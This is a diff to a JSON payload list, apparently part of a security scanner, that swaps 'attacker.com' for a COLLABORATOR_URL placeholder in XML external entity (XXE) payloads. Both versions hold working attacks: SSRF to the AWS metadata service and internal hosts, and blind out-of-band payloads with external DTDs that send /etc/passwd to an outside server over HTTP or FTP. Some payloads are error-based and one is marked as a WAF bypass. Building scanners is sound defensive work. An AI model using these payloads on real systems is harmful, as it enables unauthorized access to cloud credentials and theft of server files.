@@ -19,7 +19,7 @@
       "description": "XXE payloads for Server-Side Request Forgery via external entities",
       "payloads": [
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", "description": "XXE SSRF to AWS IMDSv1", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><root>&xxe;</root>", "description": "XXE SSRF to external server for detection", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR_URL/\">]><root>&xxe;</root>", "description": "XXE SSRF to Collaborator for OOB detection", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/internal/api\">]><root>&xxe;</root>", "description": "XXE SSRF to internal service", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><root>&xxe;</root>", "description": "XXE SSRF to internal network gateway", "waf_bypass": false}
       ]
@@ -27,17 +27,17 @@
     "blind_oob": {
       "description": "Blind XXE payloads using out-of-band data exfiltration",
       "payloads": [
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root>test</root>", "description": "Blind XXE loading external malicious DTD", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker.com/exfil.dtd\"> %dtd;]><root>test</root>", "description": "Blind XXE two-stage: loads external DTD that defines entity using %file; — DTD content: <!ENTITY % eval \"<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>\"> %eval;", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://attacker.com:21/data\"> %xxe;]><root>test</root>", "description": "Blind XXE via FTP for slow-read data exfiltration", "waf_bypass": false},
-        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on attacker server as evil.dtd)", "waf_bypass": false}
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"> %xxe;]><root>test</root>", "description": "Blind XXE loading external DTD from Collaborator (replace COLLABORATOR_URL via generate_collaborator_payload)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://COLLABORATOR_URL/exfil.dtd\"> %dtd;]><root>test</root>", "description": "Blind XXE two-stage: loads external DTD that defines entity using %file; — DTD content: <!ENTITY % eval \"<!ENTITY send SYSTEM 'http://COLLABORATOR_URL/?x=%file;'>\"> %eval;", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://COLLABORATOR_URL:21/data\"> %xxe;]><root>test</root>", "description": "Blind XXE via FTP for slow-read data exfiltration (Collaborator)", "waf_bypass": false},
+        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://COLLABORATOR_URL/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on Collaborator-served evil.dtd)", "waf_bypass": false}
       ]
     },
     "parameter_entity": {
       "description": "XXE payloads using XML parameter entities for advanced exploitation",
       "payloads": [
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe; %payload; %send;]><root>test</root>", "description": "Parameter entity chain loading external DTD", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><root>test</root>", "description": "External DOCTYPE for blind XXE via SYSTEM identifier", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"> %xxe; %payload; %send;]><root>test</root>", "description": "Parameter entity chain loading external DTD (Collaborator)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"><root>test</root>", "description": "External DOCTYPE for blind XXE via SYSTEM identifier (Collaborator)", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> %local_dtd;]><root>&ISOtech;</root>", "description": "Error-based XXE repurposing local DTD file", "waf_bypass": true},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE message [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\">]><message>&start;&file;&end;</message>", "description": "CDATA wrapping to handle special chars in exfiltrated data", "waf_bypass": false}
       ]
